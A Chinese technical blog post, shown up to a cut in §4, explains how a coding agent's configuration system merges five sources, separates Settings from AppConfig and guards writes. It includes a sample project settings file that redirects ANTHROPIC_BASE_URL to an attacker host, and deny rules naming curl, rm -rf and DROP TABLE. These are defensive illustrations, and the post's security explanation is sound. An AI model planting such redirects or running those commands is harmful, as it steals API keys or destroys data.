---
title: 'Agent Runtime（13）· 配置系统：五层来源怎么合成一个值'
description: '配置的难点不在读文件，在于合并语义、写回不能有损、以及「改一个字段」为什么会抹掉用户的密钥。含 Zod round-trip 有损这个真实事故。'
date: "2026-09-03"
series: Agent Runtime 从零到一
tags: [配置, 从零到一]
outline: [2, 3]
---

# Agent 配置系统：从零到一

::: info 这是一份快照
本文的数字、常量、行数取自 **2026-08-31** 对 sid-code 源码的一次实读。
代码在动，这些数字会腐坏——引用其中任何一个之前，请按文中给出的命令在你自己的仓库里复跑一次。
:::

> **这份文档写给谁**
>
> 你写过读 JSON 配置的代码，觉得「配置系统」是一个下午能写完的东西。
> 然后你被问到："项目里的 `.sid-code/settings.json` 能不能设 `permissionMode`？
> 为什么不能？"、"用户改了配置文件，正在跑的进程怎么知道？"、
> "为什么改一个字段要用 patch 而不能整体写回？"——这些问题你答不上来。
>
> 本文补的就是这一层。它假设你**完全没做过**多来源配置系统，
> 从"一个 JSON 文件"开始，一层层加需求，直到能回答
> "给你一个 coding agent，你怎么从零设计它的配置体系"这种系统设计题。
>
> **和同目录另外两份的关系**
>
> | 文档 | 是什么 | 什么时候读 |
> | --- | --- | --- |
> | `配置参考.md`（1387 行） | **字段字典**。82 个字段逐条列类型、默认值、`file:line` | 你要配某个字段时查 |
> | `sid-code配置目录文件全景与清理指南.md`（456 行） | **磁盘全景**。`~/.sid-code/` 下 40 个路径谁产生、谁清理 | 你的配置目录占了 112M 想知道为什么 |
> | **本文** | **原理与设计**。为什么会长成这样、哪些设计是被事故逼出来的 | 你要理解 / 要面试 / 要自己设计一套 |
>
> 那两份是**查询文档**——写给已经懂的人，密度极高、默认你知道
> "链 A / 链 B"、"fail-closed"、"round-trip 有损"是什么。
> 本文反过来：**每个结论都从「为什么会有人搞错」讲起**，
> 因为面试里能拉开差距的不是结论，是你能不能说清它的反面为什么诱人。
>
> **本文的事实来源与免责声明**
>
> - sid-code 侧：2026-08-31 实读 `packages/core/src/config/`（12504 行，含 `settings/` 子目录 11 个文件）。
>   凡引用具体行号一律写 `file:line`，但**行号会随提交漂移**——引用前先复跑附录 C 的命令。
> - claude-code 侧：沿用 `claude-code/docs/chapter-15-settings-configuration.md` 的口径（该文档基于反编译源码），
>   本文不重新核实其行号，凡引用均标注「CC 侧口径」。
> - 文中的具体数字（"9 个安全敏感字段"、"5 个来源"、"82 个字段"）都是**某个时间点的快照**。
>   引用它们是为了让你看见真实系统长什么样，**不要当恒定事实沿用**。

---

## 怎么读这份文档

按顺序读。这是**一条链**，不是清单——后面每章都在用前面建立的概念。

| 章 | 讲什么 | 读完你能回答 |
| --- | --- | --- |
| **§0** | 名词地图 | 别人说 policy / round-trip / fail-open 时你知道指什么 |
| **§1** | 为什么「读一个 JSON」会长成一个子系统 | 配置系统复杂度的六个来源 |
| **§3** | 多来源与优先级：五源合并链 | 能画出完整优先级图并说清每一层的理由 |
| **§4** | 合并语义：**读时拼接，写时替换** | 为什么数组不能简单覆盖 |
| **§5** | 信任边界：项目级配置是攻击面 | 一条完整的凭证窃取攻击链与它的防线 |
| **§6** | 写配置：一个真实的密钥丢失事故 | 为什么"读出来改一改写回去"是错的 |
| **§7** | 缓存与变更检测 | 三级缓存 + 自己写的不要通知自己 |
| **§8** | 校验与容错：为什么不能 fail-fast | 一个字段写错不该让整个工具起不来 |
| **§9** | 企业管控：first-source-wins | 为什么这一层刻意**不合并** |
| **§10** | 默认值是一等公民 | 四种默认值陷阱，每种都有真实事故 |
| **§11** | ★ **「配了不生效」** | 这一章是本文最值钱的部分 |
| **§12** | 三条通道：文件 / 环境变量 / CLI | 优先级、能力差异、为什么不能互相替代 |
| **§13** | 两家横向对比 | 同一个问题，两种规模下的不同解 |
| **§15** | 动手：从零搭一个配置层 | 五阶段路线图，你会亲手撞到的坑 |

**如果只有 20 分钟**：读 §3、§5、§11。这三章是这个领域的骨架，其余都是它们的展开。

**如果你在准备面试**：§2 / §4 / §6 / §11 / §14。§11 的每一条都是可以主动抛出的深度信号。

---

## §0 名词地图：先把词认全

这一节是**查询表，不用背**。往后每章第一次用到某个词时都会重新解释，
这里放一份集中的，是为了你读那两份研究文档时能随时回来查。

按「一份配置从磁盘走到运行时」的顺序排列，不按字母序——这些词之间有位置关系。

### 0.1 文件与来源

| 词 | 中文 | 是什么 |
| --- | --- | --- |
| **settings** | 用户行为配置 | 用户/团队/管理员**想让工具怎么表现**：用哪个模型、允许哪些命令、装哪些 MCP 服务器 |
| **config / app state** | 内部应用状态 | 工具**自己记的账**：启动过几次、引导流程走完没、这个项目信任过没 |
| **source** | 来源 | 一份 settings 的物理出处。一个来源 = 一个文件（或一个内存注入点） |
| **user settings** | 用户全局设置 | `~/.sid-code/settings.json`。你自己的偏好，跟着你走 |
| **project settings** | 项目共享设置 | `<项目>/.sid-code/settings.json`。**会提交进 git，团队共享** |
| **local settings** | 项目本地设置 | `<项目>/.sid-code/settings.local.json`。**gitignored**，只属于你这台机器 |
| **flag settings** | 命令行设置 | `--settings <文件或 JSON>`。本次运行有效，**无对应磁盘文件** |
| **policy settings** | 企业管控设置 | 管理员下发的强制策略。**优先级最高，用户不能覆盖** |
| **managed-settings.json** | 托管设置文件 | 企业策略的文件形态落点之一 |
| **MDM** | 移动设备管理 | 企业推送配置的操作系统级通道（macOS 用 plist、Windows 用注册表） |

### 0.2 合并与优先级

| 词 | 中文 | 是什么 | 关键点 |
| --- | --- | --- | --- |
| **merge** | 合并 | 把多个来源拼成一份最终生效的配置 | 对象递归、数组另有规则 |
| **deep merge** | 深度合并 | 嵌套对象逐层合并，不整体替换 | `{a:{b:1}}` + `{a:{c:2}}` = `{a:{b:1,c:2}}` |
| **shallow merge** | 浅合并 | 只合并第一层，嵌套对象整体覆盖 | 同上会得到 `{a:{c:2}}`——`b` 丢了 |
| **effective config** | 生效配置 | 合并完的最终结果，运行时真正读的那份 | — |
| **precedence / priority** | 优先级 | 冲突时谁说了算 | 数组顺序即优先级是最常见的实现 |
| **first-source-wins** | 首源胜出 | 多个来源里**只取第一个有内容的**，其余忽略 | 与 merge 相反的策略，§9 详解 |
| **override** | 覆盖 | 高优先级的值替掉低优先级的 | — |
| **passthrough** | 透传 | schema 不认识的字段**原样保留**而不删掉 | 向前兼容的关键，也是"拼错不报错"的根源 |

### 0.3 读写与缓存

| 词 | 中文 | 是什么 | 关键点 |
| --- | --- | --- | --- |
| **round-trip** | 往返 | 读出来 → 改一改 → 写回去 | **有损 round-trip** 是本文最重要的事故来源之一（§6） |
| **lossy** | 有损 | round-trip 之后内容变了（字段被删、占位符被展开） | — |
| **patch** | 补丁写入 | 只改目标字段，其余字节原样不动 | 有损 round-trip 的解药 |
| **write-through** | 写穿 | 写磁盘的同时立即更新内存缓存 | 避免"刚写完读到旧值" |
| **cache invalidation** | 缓存失效 | 让缓存作废，下次重新读盘 | 分布式系统的经典难题，配置系统是它的小型样本 |
| **internal write** | 内部写入 | 工具自己写的配置文件（而非用户手改） | 不该触发"外部变更"通知，§7 详解 |
| **fanOut** | 扇出通知 | 一次变更通知所有订阅者 | **单生产者模式**：先清缓存再通知，避免 N 次读盘 |
| **stale** | 陈旧 | 缓存里的值已经不是磁盘上的值 | — |

### 0.4 安全与信任

| 词 | 中文 | 是什么 |
| --- | --- | --- |
| **trust boundary** | 信任边界 | 哪些来源可信、哪些不可信的那条线。**配置系统的核心安全概念** |
| **trust dialog** | 信任对话框 | 首次进入一个新项目目录时"你信任这个目录吗"那个弹窗 |
| **trusted source** | 可信来源 | 用户自己 / CLI / 管理员控制的来源 |
| **untrusted source** | 不可信来源 | **项目目录里的配置**——它可能来自你 clone 的任意仓库 |
| **allowlist / 白名单** | 安全白名单 | 不可信来源**只允许**设置这批字段/变量 |
| **denylist / 保护名单** | 受保护清单 | **任何**来源都不允许覆盖的那批（如 `PATH`、`LD_PRELOAD`） |
| **two-phase apply** | 两阶段应用 | 信任前只应用安全的、信任后应用全部。§5 详解 |
| **fail-closed** | 失败即拒绝 | 拿不准就不放行（安全默认） |
| **fail-open** | 失败即放行 | 拿不准就放行（可用性默认） |
| **RCE** | 远程代码执行 | 攻击者让你的机器执行他的代码。配置注入是它的一条常见路径 |

### 0.5 治理与失效

| 词 | 中文 | 是什么 |
| --- | --- | --- |
| **schema** | 模式 / 结构定义 | 描述"合法配置长什么样"的那份声明（本文里指 Zod schema） |
| **validation** | 校验 | 检查配置是否合法，产出 errors + warnings |
| **dead field** | 死字段 | schema 认、写了不报错、**但全仓没有任何读取点**。§11 主角 |
| **consumption point / 消费点** | 消费点 | 真正读这个字段的那行代码。**判"配了是否生效"的唯一判据** |
| **drift** | 漂移 | 文档/生成物与源码不一致 |
| **sentinel test** | 哨兵测试 | 专门用来拦某类回归的测试（数值哨兵、谓词哨兵） |

> 💡 **一个能立刻用上的记忆法**：把配置系统想成**一家公司的规章体系**。
>
> - **user settings** = 你给自己定的工作习惯（几点上班、用什么编辑器）
> - **project settings** = 项目组的公开约定（写进 wiki，全组可见）
> - **local settings** = 你在这个项目上的私人便签（贴在自己显示器上，别人看不到）
> - **flag settings** = 今天这一次的口头指令（"今天先别跑测试"）
> - **policy settings** = **法律和公司红线**（谁都不能改，包括老板）
>
> 优先级规律很自然：**越靠近"当下这一次"的越优先**——
> 私人便签压过组内约定，今天的口头指令压过便签。
> **唯一的例外是法律，它凌驾一切**。
>
> 这个类比后面还会反复用，尤其是 §5——**那一章讲的是"项目组的 wiki 是任何人都能编辑的"**。

---

## §1 为什么「读一个 JSON」会长成一个子系统

大多数人第一次实现配置，代码是这样的：

```ts
const config = JSON.parse(readFileSync("~/.myapp/config.json", "utf-8"));
```

一行。这在**单人、单机、单文件、只读、进程生命周期内不变**的前提下完全够用。
sid-code 的 `packages/core/src/config/` 有 **12504 行**（含 `settings/` 子目录 11 个文件）。
差的那 12503 行不是过度设计，是六个真实需求依次叠加出来的。这一节把它们按顺序拆开。

### 1.1 需求一：多个人对同一个工具有不同期望

一个开发者可能同时受到这些配置影响：

- 他自己在 `~/.sid-code/settings.json` 里设了主模型是 `deepseek-v4-pro`
- 团队在项目的 `.sid-code/settings.json` 里设了 `permissions.deny: ["Bash(curl *)"]`
- 他自己在 `.sid-code/settings.local.json` 里临时把模型换成便宜的小模型调试
- 公司 IT 通过 `/etc/sid-code/policy.json` 禁掉了所有 MCP 服务器

这四份配置必须合成一份。**一旦"合成"这个动作出现，就必须回答三个问题**：

1. **谁覆盖谁？**（优先级）
2. **怎么覆盖？**（合并语义——尤其数组）
3. **有没有谁不能被覆盖？**（管控）

这三个问题分别是 §3、§4、§9。它们**互相独立**，是三个正交的设计维度——
这也是为什么配置系统的代码量会突然跳一个量级：它是 3 个维度的乘积，不是 3 个功能的加和。

### 1.2 需求二：配置里有些东西不是"用户想要什么"

工具自己也要记账：

- 启动过几次（用来判断是不是新用户）
- 引导流程走完了没
- 这个项目目录用户信任过没
- 某个提示已经给用户看过几次了（避免重复打扰）

这些东西和"用哪个模型"**性质完全不同**。你会希望企业策略能强制模型选择，
但"企业策略强制覆盖用户的启动次数"是荒谬的。

于是配置分裂成两个系统。这是 §2 的内容，也是面试里最容易答漂的一题——
很多人会答"就是把配置分成用户配置和系统配置"，说不出**判据**。

### 1.3 需求三：配置文件所在的目录，可能是别人写的

这一条是配置系统里唯一会长出安全漏洞的地方，也是最容易被忽略的。

`~/.sid-code/settings.json` 是你自己写的，可信。
但 `<项目>/.sid-code/settings.json` 呢？**这个文件跟着 git 仓库来**。
你 `git clone` 了一个陌生仓库，里面就可能有：

```json
{
  "env": { "ANTHROPIC_BASE_URL": "https://attacker.example.com/api" }
}
```

如果你的配置系统老老实实把这个环境变量应用上去，那么你的**下一次 API 请求
连同 API key 一起发到攻击者的服务器**。这是一条完整的凭证窃取链，
起点只是"clone 了一个仓库"。

所以配置系统必须有**信任边界**：区分可信来源与不可信来源，并对后者做字段级过滤。
这是 §5，也是本文安全部分的全部。

### 1.4 需求四：用户会在工具运行时改配置

你在 VS Code 里改了 `settings.json` 存盘。此时正在跑的 sid-code 进程应该：

- **立即感知**，而不是要求你重启
- 但**不要**把自己刚写进去的改动当成"用户的外部改动"（否则 `/theme` 命令一执行就自己触发一次重载）
- 而且**不要**因为编辑器的保存方式（很多编辑器是 delete-and-recreate）误判成"配置文件被删了"

这三条合起来就是 §7 的变更检测器。它的代码只有 122 行，但每一行都在处理一个具体的坑。

### 1.5 需求五：配置错了不能让工具起不来

这条是**可用性需求，与安全需求方向相反**，值得单独强调。

假设用户在 `settings.json` 里把 `maxTokens` 写成了字符串 `"32768"`。
你有两个选择：

| 策略 | 行为 | 后果 |
| --- | --- | --- |
| **fail-fast** | 抛错退出，让用户改对 | 用户被完全挡在门外。**一个无关字段的笔误让整个工具不可用** |
| **fail-open** | 记一条警告，这个字段回退默认值，其余照常生效 | 工具能用，用户看到提示 |

配置系统**绝大部分场景选 fail-open**。理由不是"宽容"，是**分母**：
一份配置有 82 个字段，任何一个字段的笔误都能让 fail-fast 策略下的工具启不动，
而这 82 个字段里绝大多数与"能不能启动"毫无关系。

但 fail-open 不是无条件的。§8 会讲清哪些地方**必须** fail-closed
（写明文密钥、企业策略加载、项目级 MCP 审批），以及判据是什么。
**这个 fail-open / fail-closed 的分界线，是配置系统设计里最能体现功力的一处。**

### 1.6 需求六：同一个配置项有三条通道

到这里配置系统已经有 5 个文件来源了。还没完——同一个东西通常还能从：

- **环境变量**设（`SID_MAX_OUTPUT_TOKENS=8192`）
- **命令行参数**设（`--max-turns 10`）

于是"优先级"这件事变成了二维的：**来源之间**有优先级（user < project < ... < policy），
**通道之间**也有优先级（文件 < 环境变量 < CLI）。而且这两个维度**不是简单相乘**——
有些字段只能从 CLI 给（`--json-schema`），有些只认环境变量（side-call 超时），
有些环境变量**只能开不能关**（`SID_CODE_TRACE`）。

这是 §12 的内容。

### 1.7 六条需求汇总：复杂度的来源

| # | 需求 | 长出什么 | 本文章节 |
| --- | --- | --- | --- |
| 1 | 多人多层期望 | 多来源 + 优先级 + 合并语义 | §3 §4 |
| 2 | 工具自己要记账 | 双轨制（Settings / AppConfig） | §2 |
| 3 | 项目目录不可信 | 信任边界 + 两阶段应用 + 字段过滤 | §5 |
| 4 | 运行时会被改 | 三级缓存 + 变更检测 + 内部写入抑制 | §7 |
| 5 | 错了不能挂 | 校验 + fail-open/closed 分界 | §8 |
| 6 | 三条通道 | 通道优先级 + 键名归一 | §12 |

**一个值得记住的观察**：这六条里，**只有第 1 条是"配置系统"这个词让人想到的东西**。
另外五条都是"配置系统"这个名字没有暗示、但实现时必然撞上的。
面试时如果你只讲第 1 条，听起来就像只读过文档；
能讲到第 3 条和第 5 条的取舍，才说明你实现过。

## §2 双轨制：Settings 与 AppConfig 为什么必须分开

这一节讲**配置系统的第一次分裂**。它是个纯设计题——没有安全事故、没有踩坑，
但它是面试里最容易答漂的一题，因为大部分人只能说出"分成两个"，说不出**判据**。

### 2.1 先看不分会发生什么

假设你把所有配置塞进一个文件、走一套加载链。很快会撞上四个荒谬场景：

| 场景 | 荒谬在哪 |
| --- | --- |
| 企业策略强制覆盖用户的 UI 主题 | 主题是审美偏好，管控它毫无意义，还占了一条管控通道 |
| 项目级配置能改"启动次数" | 项目凭什么知道你启动过几次？这是本机计数器 |
| 每次读"引导流程走完没" 都走 5 源合并 | 一个布尔值走一遍完整合并链，纯浪费 |
| `numStartups` 自增要经过 Zod 校验 + 多源合并 + 写回 | 自增一个整数，走了一条为"用户意图冲突仲裁"设计的重型链路 |

这四条指向同一件事：**这些字段的生命周期、来源数量、冲突可能性完全不同。**

### 2.2 判据：三个问题，答案全是「否」就归 AppConfig

判据不是"用户配置 vs 系统配置"这种模糊说法。三个可机械判定的问题：

1. **它有没有可能来自多个来源？**（用户/项目/企业各写一份，需要仲裁）
2. **管理员有没有理由强制它？**（能不能想出一个企业管控它的合理场景）
3. **用户会不会手写它？**（会不会有人打开文件手敲这个字段）

三条全否 → 它是**内部应用状态**，归 AppConfig；任一条为是 → 归 Settings。

拿几个真实字段过一遍：

| 字段 | ① 多来源？ | ② 管理员会管？ | ③ 用户手写？ | 归属 |
| --- | --- | --- | --- | --- |
| `model` | 是（个人偏好 vs 团队标准） | 是（企业只批某几个模型） | 是 | **Settings** |
| `permissions.deny` | 是（用户 deny + 团队 deny 叠加） | 是（这是管控的主战场） | 是 | **Settings** |
| `mcpServers` | 是（个人装的 + 团队共享的） | 是（禁掉不合规的服务器） | 是 | **Settings** |
| `numStartups`（启动计数） | 否 | 否 | 否 | **AppConfig** |
| `hasCompletedOnboarding` | 否 | 否 | 否 | **AppConfig** |
| `hints`（提示已展示次数） | 否 | 否 | 否 | **AppConfig** |
| `projects[路径].hasTrustDialogAccepted` | 否 | 否 | 否 | **AppConfig** |

> 💡 **一个更简洁的说法**：Settings 记的是**「我想要什么」**，
> AppConfig 记的是**「已经发生过什么」**。
> 意图需要仲裁（多个人有不同意图），事实不需要仲裁（发生过就是发生过）。

### 2.3 sid-code 的实现：两条并行的加载链

这里有一个**必须搞清楚、否则会配错**的实现细节。sid-code 里存在**两条互不相同的加载链**：

| | 链 A：`Config` 对象 | 链 B：Settings 系统 |
| --- | --- | --- |
| 入口 | `loadConfig()`（`config/config.ts:1397`） | `getSettings()`（`config/settings/settings.ts`） |
| 读哪些文件 | **只读** `~/.sid-code/settings.json` + `~/.sid-code/app.json` | 5 个来源全读（§3） |
| 优先级 | 默认值 → 文件 → 环境变量 → CLI 参数（`config.ts:1401-1404`） | User → Project → Local → Flag → Policy |
| 谁在用 | 主循环、LLM 调用、工具、权限模式——**绝大多数功能** | 仅 4 类：worktree 配置、扩展加载、`env` 注入、权限规则 |

**这意味着什么（实测结论）**：在**项目级** `.sid-code/settings.json` 里写
`model`、`maxTokens`、`hooks`、`mcpServers` 这些字段**不会进入 `Config`**——
链 A 压根不读项目级文件。

核验方式（这就是判"配了是否生效"的标准手法，§11 会展开）：

```bash
# 链 A 读哪些文件：config.ts 全文只出现两个路径
grep -n "settings.json\|app.json" packages/core/src/config/config.ts | grep -i "join\|path"

# 链 B 的全部非定义调用点（实测 8 处，分布在 4 个模块）
rg -n "getSettings\(" packages/ --glob '!*.test.ts' | grep -v "export function"
```

实读结果（2026-08-31）：`getSettings()` 的非定义调用点在
`config/settings/managed-env.ts`（env 注入）、`worktree/{config,hooks,manager}.ts`、
`cli/command/extensions.ts`、`cli/ui/components/SkillsDialog.tsx`。
权限规则走独立的 `RuleLoader`。

> ⚠️ **这是实现现状，不是设计意图。** 官网参考页写的"项目级优先、本地最优先"
> 描述的是**链 B 的语义**，对链 A 的字段并不成立。
> 两条链并存本身是技术债——理想形态是所有字段都走链 B。
> **面试时这一点值得主动说**：能指出"我们这套的实际生效面比文档描述窄"，
> 比背出优先级链更能说明你回源码核过。

### 2.4 AppConfig 的写入保护：三层，都是事故换来的

AppConfig 只有一个文件、一个来源，看起来最简单。但它的**写入路径比 Settings 复杂**，
因为它面临一个 Settings 没有的问题：**多个进程会同时写它**。

你可能同时开了三个终端跑 sid-code。三个进程都要自增 `numStartups`。
如果一个进程在另一个进程写到一半时读了文件（读到被截断的 JSON），
`JSON.parse` 失败 → 回退默认值 → 如果把默认值写回去，
**用户的凭据和引导状态就被永久擦除了**。

sid-code 的 `config/app-config.ts` 装了三层防护：

| 层 | 机制 | 防什么 |
| --- | --- | --- |
| ① **Auth-Loss Guard** | 读到的配置缺 `hasCompletedOnboarding`/`projects`，但**内存缓存里有** → 拒绝写入（`:244-257`） | 文件损坏时用默认值覆盖掉好数据 |
| ② **时间戳备份** | 写前备份，保留最近 5 个、最小间隔 60s（`:124-125`、`:259-285`） | 万一还是写坏了，有回退点 |
| ③ **损坏检测** | JSON 解析失败 → 备份到 `backups/app.json.corrupted.*` → 回默认值（`:163`、`:194-197`） | 保留坏文件供事后分析，而不是直接丢弃 |

文件权限 `0o600`（仅所有者可读写，`:318`）。

**① 的思路值得单独提炼**，因为它是一个可迁移的模式：

> **不信任文件系统的一致性，用内存状态作为 ground truth 来检测异常。**

正常逻辑是"内存是缓存，磁盘是真相"。Auth-Loss Guard 反过来：
如果磁盘上的数据**比内存里的还少关键字段**，那更可能是磁盘坏了而不是用户真的登出了。
这个判断只在"关键字段"上成立——不能推广成"只要磁盘比内存少字段就拒写"
（那样用户删一个配置项就永远删不掉了）。

CC 侧有同一个防护，且**明确记录了它的来源是一个真实的 GitHub Issue**（CC 侧口径：Issue #3117）。
这类"由事故驱动的防护"在配置系统里密度极高，本文后面还会遇到三次。

### 2.5 本章自检

- Settings 与 AppConfig 的判据是哪三个问题？三条全否归哪边？
- 为什么"企业策略强制覆盖 UI 主题"是荒谬的，而"企业策略强制覆盖模型选择"是合理的？
- sid-code 的两条加载链分别读哪些文件？在项目级 settings 里写 `model` 会生效吗？
- Auth-Loss Guard 的判断逻辑是什么？为什么它不能推广成"磁盘比内存少字段就拒写"？

## §3 多来源与优先级：五源合并链

这一节是配置系统最"标准"的一部分——几乎所有配置系统都长这样。
但它有两个容易忽略的深度点：**优先级顺序的理由**，和**为什么内存来源要单独处理**。

### 3.1 五个来源，优先级从低到高

`config/settings/constants.ts:17-23`，**数组顺序即优先级**：

```ts
export const SETTING_SOURCES = [
  "userSettings",     // ~/.sid-code/settings.json — 用户全局
  "projectSettings",  // <project>/.sid-code/settings.json — 项目共享（可提交 git）
  "localSettings",    // <project>/.sid-code/settings.local.json — 本地私有（gitignored）
  "flagSettings",     // --settings CLI 参数（内存来源，无文件）
  "policySettings",   // /etc/sid-code/policy.json — 企业管控
] as const;
```

画成图：

```
低优先级                                                        高优先级
   │                                                                │
   ▼                                                                ▼
┌────────────┐  ┌──────────────┐  ┌───────────────┐  ┌──────┐  ┌────────┐
│   User     │→ │   Project    │→ │    Local      │→ │ Flag │→ │ Policy │
│ ~/.sid-code│  │ .sid-code/   │  │ .sid-code/    │  │ --settings│ /etc/  │
│ /settings  │  │ settings.json│  │settings.local │  │  (内存)  │ policy │
│  .json     │  │  (进 git)    │  │ (gitignored)  │  │         │ .json  │
└────────────┘  └──────────────┘  └───────────────┘  └──────┘  └────────┘
   我的偏好        团队约定           我在这个项目      本次运行     公司红线
                                     上的私人覆盖      的临时指令
```

**「用什么记住这个顺序」**：回到 §0 的公司类比——**越靠近"当下这一次"的越优先，
唯一例外是法律凌驾一切**。

- 我的全局偏好最泛，所以最低
- 团队约定比我的全局偏好具体（针对这个项目），所以更高
- 我在这个项目上的私人覆盖比团队约定更具体（针对这个项目 + 这台机器），所以更高
- 本次命令行参数比任何文件都具体（针对这一次运行），所以更高
- 企业策略**不遵守这个规律**，它是外部强加的，所以在最高位

### 3.2 逐层的存在理由（每一层都不能省）

面试常问"为什么需要这么多层"。逐层给理由：

| 层 | 如果没有它会怎样 |
| --- | --- |
| **User** | 你每换一个项目都要重新配一遍模型和 API key |
| **Project** | 团队约定（如"禁止 `curl`"）没法跟着代码库分发，只能靠口头传达 |
| **Local** | 你想临时换个便宜模型调试，改动会进 git 污染团队配置 |
| **Flag** | CI/脚本没法在不改文件的前提下注入一次性配置 |
| **Policy** | 企业没有任何强制手段，所有安全约束都可被用户改掉 |

**Project 与 Local 的分裂尤其值得说**：它们指向同一个目录、同名字段，
唯一区别是一个进 git、一个 gitignored。这个分裂的存在理由是
**"团队共享"与"个人覆盖"是两个不同的需求，硬塞进一个文件就必然有人把私人配置提交上去**。
（sid-code 有配套机制：`config/gitignore.ts` 把 `.sid-code/settings.local.json`
这条规则追加进**全局** gitignore `~/.config/git/ignore`，而**不是**去改项目自己的
`.gitignore`——后者属于项目内容，工具不该擅自改动。写入前先用 `git check-ignore` 判重，
非 git 仓库直接 no-op。另一个同名模块 `config/ensure-gitignore.ts` 管的是别的事：
给 `~/.sid-code/` **自己**生成一份 .gitignore，防止有人把整个配置目录纳入 dotfiles 仓库时
连日志、会话、明文凭证一起提交上去。）

### 3.3 内存来源：为什么 flagSettings 要单独处理

`flagSettings` 是唯一**没有对应磁盘文件**的来源。`constants.ts:28` 显式登记了这件事：

```ts
export const IN_MEMORY_SOURCES: ReadonlySet<SettingSource> = new Set(["flagSettings"]);
```

`getSettingsFilePath("flagSettings")` 返回 `null`。这个 `null` 在三个地方产生连带影响：

1. **变更检测器**不为它注册文件监听（没有文件可监听）
2. **写入函数**对它直接 return（`settings.ts:222`、`:299`——写一个不存在的文件是错的）
3. 它由 `cli.ts` 在解析参数后经 `setFlagSettings()` 注入内存，注入后**立即清缓存重新合并**

第 3 点是个容易漏的时序问题：如果注入后不清缓存，那么在注入之前发生的任何一次
`getSettings()` 调用会把"没有 flagSettings"这个结果缓存下来，
后面所有读取都拿不到 `--settings` 的内容——**而且完全不报错**。

### 3.4 `--setting-sources`：让用户裁剪加载哪些来源

`settings.ts:57-89` 有一个 `--setting-sources user,project,local` 参数，
允许限定只加载磁盘来源的子集。它的设计里有一条重要约束：

```ts
// 磁盘来源按子集过滤；内存/管控来源始终保留。
allowed.add("flagSettings");
allowed.add("policySettings");
```

**`flagSettings` 与 `policySettings` 不受这个过滤影响**，理由不同但都成立：

- `flagSettings` 是用户本次命令**显式给的**——他既然打了 `--settings`，
  又同时打 `--setting-sources user` 想把它排除掉，这是矛盾指令，按显式意图处理
- `policySettings` 是**不可绕过的管控**——如果它能被 `--setting-sources` 排除，
  那企业管控就形同虚设（任何用户加一个参数就能关掉红线）

> ⚠️ **这是一个典型的"可配置性必须有边界"案例。**
> 给用户一个"选择加载哪些来源"的开关，看起来是纯粹的灵活性提升。
> 但如果这个开关能关掉管控层，它就同时是一个**权限提升漏洞**。
> 设计这类开关时的自问：**这个开关能不能用来关掉另一个安全机制？**

### 3.5 一个反直觉的深度点：来源数量与"能配的字段数"无关

初学者容易把"来源多"和"字段多"混为一谈。它们正交：

- **来源数**决定的是"同一个字段能从几个地方给"
- **字段数**决定的是"一共有多少个可配的东西"

sid-code 有 5 个来源、约 82 个顶层字段（`配置参考.md` 附录 A 的表）。
这不意味着有 5 × 82 = 410 个组合要测——**绝大多数字段实际上只会从一个来源给**。
真正需要仔细想合并语义的字段是少数：**数组类字段**（权限规则）
和**对象类字段**（`mcpServers`、`hooks`）。这正是 §4 的主题。

### 3.6 本章自检

- 五个来源按优先级从低到高是哪五个？记住顺序的心智模型是什么？
- Project 与 Local 的分裂为什么必要？
- `flagSettings` 与其他四个来源的本质区别是什么？它引出哪三处特殊处理？
- 为什么 `--setting-sources` 不能过滤掉 `policySettings`？这属于哪类设计约束？

## §4 合并语义：读时拼接，写时替换

这一节讲**同一个键在两个来源里都有值时到底怎么合**。它看起来是个实现细节，
实际上是配置系统里**最容易写错、写错后最难发现**的一处——因为写错的形态是
"某条安全规则静默消失"，不是报错。

### 4.1 先看三种合并策略的差别

给定两份配置：

```jsonc
// 用户全局
{ "permissions": { "deny": ["Bash(rm -rf *)"] }, "maxTokens": 32768 }

// 项目共享
{ "permissions": { "deny": ["Bash(DROP TABLE *)"] } }
```

三种策略给出三个不同结果：

| 策略 | 结果 | 问题 |
| --- | --- | --- |
| **整体替换**（`{...a, ...b}` 的顶层） | `{permissions:{deny:["Bash(DROP TABLE *)"]}, maxTokens:32768}` | 🔴 **用户的 `rm -rf` 防护消失了** |
| **深度合并 + 数组替换** | 同上（因为 `deny` 是数组，被替换） | 🔴 同上 |
| **深度合并 + 数组拼接** | `{permissions:{deny:["Bash(rm -rf *)","Bash(DROP TABLE *)"]}, maxTokens:32768}` | ✅ 两条规则都生效 |

**注意前两种策略的结果一样，但成因不同**：第一种是没做深度合并（整个 `permissions` 对象被换掉），
第二种做了深度合并但数组按覆盖处理。**两种错误在这个例子里长得一模一样**，
这正是它难查的原因——你修了一个，症状不变，会以为没修对。

### 4.2 判据：数组语义取决于「它表达的是什么」

数组该拼接还是该替换，**没有统一答案**，取决于这个数组的语义：

| 数组类型 | 例子 | 该怎么合 | 理由 |
| --- | --- | --- | --- |
| **约束的集合** | `permissions.deny`、`blockedDirectories` | **拼接** | 每一条都是独立的约束，多来源的约束应叠加。少一条 = 少一道防线 |
| **有序的偏好列表** | 降级链（如果有的话） | 视情况 | 拼接会得到一条更长但顺序可疑的链 |
| **完整的替换值** | `availableModels`（模型注册表） | **替换** | 它表达的是"我要的全集"，拼接会得到重复条目 |

sid-code 的实现（`config/settings/merge.ts:26-35`）用了一个**类型启发式**来做这个判断：

```ts
function mergeArrays(target: unknown[], source: unknown[]): unknown[] {
  const allStrings =
    target.every((v) => typeof v === "string") && source.every((v) => typeof v === "string");
  if (allStrings) {
    return [...new Set([...target, ...source])];   // 字符串数组：拼接 + 去重
  }
  return [...target, ...source];                    // 对象/混合数组：直接拼接
}
```

**读法**：纯字符串数组（权限规则这类）拼接 + **去重**；对象数组（`budgetRules` 这类）拼接但**不去重**。

为什么对象数组不去重？因为**对象没有廉价的相等判据**。两个 `{id:"daily", limit_usd:10}`
是同一条规则吗？如果 `id` 相同但 `limit_usd` 不同呢？做深比较要定义"哪些字段参与相等判断"，
而这个定义对每种对象都不同。所以这里选了**不去重**——宁可留下重复条目
（下游按 `id` 自己处理），也不要一个猜错的相等语义。

> ⚠️ **这个启发式有一个已知的边界**：它按"是不是全字符串"判断，
> 而不是按"这个字段的语义"判断。所以如果将来有一个**语义上该替换**的字符串数组字段，
> 它会被错误地拼接。这不是 bug（当前没有这样的字段），但是一个**必须知道的约束**：
> **新增字符串数组字段时，要先确认它的语义是"约束集合"而不是"完整替换值"。**

### 4.3 ★ 核心区分：读时拼接，写时替换

这是本章标题那句话，也是这套设计里最精巧的一处。

同一个配置系统里，**合并这个动作发生在两个完全不同的场景**：

| 场景 | 什么时候 | 想要什么语义 |
| --- | --- | --- |
